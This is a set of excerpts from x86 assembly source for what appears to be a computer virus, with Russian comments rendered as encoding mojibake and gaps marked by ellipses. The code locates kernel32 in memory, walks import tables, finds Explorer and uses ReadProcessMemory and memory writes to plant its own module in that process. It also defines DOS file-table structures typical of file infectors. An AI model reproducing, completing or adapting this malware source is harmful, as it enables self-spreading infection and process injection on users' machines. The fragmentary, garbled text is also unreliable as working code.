...
mov   [counter+ebp],0           ;«í¡π½¿¼ »ÑαÑ¼Ñ¡¡δÑ
mov   [process_to_open+ebp],0
mov   eax,[new_rva+ebp]
mov   [old_rva+ebp],eax
pop   eax                       ;eax=address of entry of exit function
push  eax
and   eax,0ffff0000h             ;«¬απú½∩Ñ¼ ñ« ¬αáΓ¡«ú« 65536
add   eax,65536
__not_found:
sub  eax,65536
cmp  word ptr [eax],'ZM'
jne  __not_found                 ;eax - ºáúαπº«τ¡δ⌐ áñαÑß kernel32
mov   [kernel_base+ebp],eax
mov   ebx,eax                    ;ebx - ºáúαπº«τ¡δ⌐ áñαÑß kernel32
push  ebx
add   ebx,[ebx.exe_neptr]        ;eax - ¡áτá½« PE-header'a
cmp   word ptr  [ebx],'EP'
je    kernel_found
pop   ebx
jmp   goto_host
...
jmp    __2
all_funct_found:
;¡á⌐Γ¿ explorer ¿ ¿¡ßΓá½½¿α«óáΓ∞ß∩ ó »á¼∩Γ∞
push   0
...
ELSE
ENDIF
;óδñÑ½∩Ñ¼ »á¼∩Γ∞ (GlobalAlloc ê VirtualAlloc ñ½∩ íπΣÑαá »«ñ hintnames
;¿º σ«ßΓá, ¡áτ¿¡áÑ¼ »«¿ß¬ ¡Ñ«íσ«ñ¿¼δσ Σ-¿⌐, ßτ±Γτ¿¬ Σ-¿⌐ = index
;ó Address table
push   2*4096
push   0
...
mov    eax,[buffer+ebp]
mov    eax,[eax+3ch]
add    eax,[base_addr+ebp]       ;π¬áºáΓÑ½∞ ¡á PE header
IFDEF DEBUG
int   3
ELSE
ENDIF
lea    ebx,nmbofread+ebp         ;τ¿ΓáÑ¼ PE-header
push   ebx
push   100h
push  [buffer+ebp]
push   eax
...
lea    ebx,nmbofread+ebp         ;τ¿ΓáÑ¼ ¿¼∩ í¿í½¿«ΓÑτ¬¿
push   ebx
push   8
mov    ebx,[buffer+ebp]
add    ebx,20h
...
call   StrCompare
pop   eax
je    __2                              ;ß½ÑñπεΘá∩ ñ¿αÑ¬Γ«α¿∩
add   eax,14h
jmp    __3                       ;ß½ÑñπεΘá∩ ñ¿αÑ¬Γ«α¿∩
__2:                             ;¬áΓá½«ú ¿¼»«αΓá ñ½∩ KERNEL32 ¡á⌐ñÑ¡
;ó EAX - ¬áΓá½«ú ¿¼»«αΓá ñ½∩ KERNEL32
mov    eax,[buffer+ebp]
mov    eax,[eax]                 ;ó EAX - Table of Hint Names RVA's
add    eax,[base_addr+ebp]
lea    ebx,nmbofread+ebp         ;τ¿ΓáÑ¼ 4096 íá⌐Γ RVA HINTNAMES
push   ebx
push   4096
mov    ebx,[buffer+ebp]          ;τ¿ΓáÑ¼ ó buffer +4096
add    ebx,4096
push   ebx
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    eax,[buffer+ebp]          ;ó eax - buffer+4096
add    eax,4096
cld
mov     [counter+ebp],0
IFDEF DEBUG
...
add    eax,2
add    eax,[base_addr+ebp]
lea    ebx,nmbofread+ebp         ;τ¿ΓáÑ¼ ¿¼∩ Σπ¡¬µ¿¿
push   ebx
push   15
push   [buffer+ebp]                 ;τ¿ΓáÑ¼ ó buffer
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
...
push     eax
mov     [cp_addr+ebp],eax
lea    ebx,nmbofread+ebp     ;ºá»¿ßáΓ∞ ßΓáαδ⌐ áñαÑß Σ-¿¿
push   ebx
push   4
...
;mov    [mb_addr+ebp],eax
lea    ebx,nmbofwrt+ebp           ;ºá»¿ßáΓ∞ ¡áΦ ¬«ñ ¡á áñαÑß 400000h
push   ebx
push   module_size
lea    ebx, module+ebp
push   ebx
...
mov    ebx,[buffer+ebp]
mov    [ebx],400000h
lea    ebx,nmbofwrt+ebp          ;ºá¼Ñ¡¿Γ∞ áñαÑß Σ-¿¿
push   ebx
push   4
push   [buffer+ebp]
push   eax
...
nmbofread dd 0
nmbofwrt  dd 0
base_addr dd 0               ;íáº«óδ⌐ áñαÑß ¼«ñπ½∩ ß ¬«Γ«αδ¼ ¼δ αáí«ΓáÑ¼
buffer dd 0                  ;ß«ñÑαª¿Γ áñαÑß óδñÑ½Ñ¡¡«⌐ ¡á¼ »á¼∩Γ¿
...
dta_time        dw      ?               ; τττττ¼¼¼ ¼¼¼ßßßßß
dta_date        dw      ?               ; úúúúúúú¼ ¼¼¼ñññññ
dta_size        dd      ?
dta_name        db      13 dup (?)
                ends
...
sft_struc       struc
sft_handles     dw      ?               ; ß¬«½∞¬« π Σá⌐½á ñÑß¬α¿»Γ«α«ó
sft_openmode    dw      ?
sft_attr        db      ?               ; áΓα¿íπΓδ Σá⌐½á
sft_flags       dw      ?               ; í¿Γ 14 - ß«σαá¡∩Γ∞ ñáΓπ/óαÑ¼∩ »α¿ ºá¬αδΓ¿¿
sft_deviceptr   dd      ?               ; Ñß½¿ ß¿¼ó«½∞¡«Ñ πßΓα-ó« - header ñαá⌐óÑαá
sft_filecluster dw      ?               ; ¡áτá½∞¡δ⌐ ¬½áßΓÑα Σá⌐½á
sft_date        dw      ?
sft_time        dw      ?
sft_size        dd      ?
sft_pos         dd      ?
sft_lastFclustr dw      ?               ; «Γ¡«ß¿ΓÑ½∞¡δ⌐ ¡«¼Ñα ¬½áßΓÑαá ó Σá⌐½Ñ
                                        ; ¬ ¬«Γ«Γ«α¼π íδ½« »«ß½Ññ¡ÑÑ «íαáΘÑ¡¿Ñ
sft_dirsect     dd      ?               ; ßÑ¬Γ«α ß«ñÑαªáΘ¿⌐ φ½Ñ¼Ñ¡Γ ¬áΓá½«úá
sft_dirpos      db      ?               ; ¡«¼Ñα φ½Ñ¼Ñ¡Γá ¬áΓá½«úá ó ßÑ¬Γ«αÑ
sft_name        db      11 dup (?)
sft_chain       dd      ?               ; share.exe
sft_uid         dw      ?               ; share.exe
sft_psp         dw      ?
sft_mft         dw      ?               ; share.exe
sft_lastclust   dw      ?               ; ¡«¼Ñα ¬½áßΓÑαá ¬ ¬«Γ«α«¼π íδ½« »«ß½. «íαáΘ.
sft_ptr         dd      ?               ; π¬áºáΓÑ½∞ ¡á ñαá⌐óÑα ifs Σá⌐½á/0 Ñß½¿ ½«¬.
                ends
...
;GetLastError ó φΓ«¼ ß½πτáÑ »«τÑ¼π Γ« ó«ºóαáΘáÑΓ «Φ¿í¬π 07eh .
;                       call    fcheckerror
...
──────────────────────────────────────────────────────────────[STRINGS.ASM]───
;-----------------------------------------------------------
; StrCompare æαáó¡¿Γ∞ ñóÑ ßΓα«¬¿
;-----------------------------------------------------------
; éσ«ñ:
;       si = áñαÑß ßΓα«¬¿ 1 (s1)
;       di = áñαÑß ßΓα«¬¿ 2 (s2)
; éδσ«ñ:
;       ¡áí«α Σ½áú«ó ñ½∩ πß½«ó¡δσ »ÑαÑσ«ñ«ó jb, jbe,
;       je, ja, jae, or
; ÉÑú¿ßΓαδ:
;       ¡Ñ ¿ß»«½∞ºπεΓß∩
;-----------------------------------------------------------
...
ENDP StrCompare
;-----------------------------------------------------------
; StrPos ìá⌐Γ¿ óσ«ªñÑ¡¿Ñ ó ßΓα«¬π »«ñßΓα«¬¿
;-----------------------------------------------------------
; éσ«ñ:
;       si = áñαÑß ¿ß¬«¼«⌐ »«ñßΓα«¬¿
;       di = áñαÑß »α«óÑα∩Ñ¼«⌐ µÑ½Ñó«⌐ ßΓα«¬¿
; éδσ«ñ:
;       àß½¿ zf = 1, Γ«úñá dx = ¿¡ñÑ¬ß »«ñßΓα«¬¿
;       àß½¿ zf = 0, Γ«úñá »«ñßΓα«¬á ¡Ñ ¡á⌐ñÑ¡á
; çá¼Ñτá¡¿Ñ: Ñß½¿ zf = 0, Γ« º¡áτÑ¡¿Ñ ó dx ¡Ñ ¿¼ÑÑΓ ¡¿¬á¬«ú« ß¼δß½á
; ÉÑú¿ßΓαδ:
;       dx
;-----------------------------------------------------------
ASCNull EQU     0
...
;-----------------------------------------------------------
; StrLength Å«ñßτ¿ΓáΓ∞ ó ßΓα«¬Ñ ¬«½¿τÑßΓó« ¡Ñ¡π½Ñóδσ ß¿¼ó«½«ó
;-----------------------------------------------------------
; éσ«ñ:
;       di = áñαÑß ßΓα«¬¿ (s)
; éδσ«ñ:
;       cx = ¬«½¿τÑßΓó« ¡Ñ¡π½Ñóδσ ß¿¼ó«½«ó ó s
; ÉÑú¿ßΓαδ:
;       cx
;-----------------------------------------------------------
StrLength PROC
